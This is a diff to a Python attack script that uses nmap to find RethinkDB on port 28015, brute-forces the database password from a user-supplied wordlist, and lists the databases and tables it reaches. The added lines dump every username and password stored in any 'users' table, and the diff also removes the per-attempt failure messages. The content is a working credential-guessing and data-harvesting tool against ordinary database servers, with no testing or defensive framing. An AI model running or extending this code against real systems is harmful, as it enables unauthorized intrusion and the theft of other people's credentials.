@@ -11,8 +11,8 @@ def check_port_open(target, port):
         port_state = nm[target]['tcp'][port]['state']
         print(f"Nmap scan report for {target}")
         print(f"Host is {'up' if port_state == 'open' else 'down'} ({nm[target]['hostnames'][0]['name']} latency).")
-        print("\nPORT      STATE SERVICE")
-        print(f"{port}/tcp   {port_state}  rethinkdb\n")
+        print("\nPORT          STATE      SERVICE")
+        print(f"{port}/tcp     {port_state}     rethinkdb\n")
         return port_state == 'open'
     else:
         return False
@@ -24,14 +24,13 @@ def ask_for_wordlist_path():
     return user_input
 
 def brute_force_password(target, wordlist_path):
+    print("Attempting brute force...")
     with open(wordlist_path, 'r', errors='ignore') as custom_file:
         for custom_line in custom_file:
             custom_password = custom_line.strip()
             if attempt_connection(target, custom_password):
                 get_rethinkdb_databases(target, custom_password)
                 return
-            else:
-                print(f"Failed attempt with password: {custom_password}")
     
     print("Brute force failed. Password not found.")
     sys.exit(1)
@@ -46,10 +45,16 @@ def get_rethinkdb_databases(target, password):
     
     print("\nList of databases and tables:")
     for db in databases:
-        print(f"{db}:")
+        print(f"\n{db}:")
         tables = r.db(db).table_list().run(conn)
         for table in tables:
-            print(f"    {table}")
+            print(f"    {table}:")
+            if table == 'users':
+                documents = r.db(db).table(table).run(conn)
+                for document in documents:
+                    username = document.get('username', 'N/A')
+                    password = document.get('password', 'N/A')
+                    print(f"        Username: {username}, Password: {password}")
 
     conn.close()
 
@@ -68,7 +73,7 @@ if __name__ == "__main__":
     check_port_result = check_port_open(target_address, 28015)
 
     if check_port_result:
-        user_input = input(f"The port 28015 is open. \nDo you want to attempt brute forcing the password for {target_address} (y/n)? ").lower()
+        user_input = input(f"The port 28015 is open. \nAttempt brute force? (y/n)? ").lower()
         if user_input == 'y' or user_input == 'Y':
             password_file = ask_for_wordlist_path()
             brute_force_password(target_address, password_file)
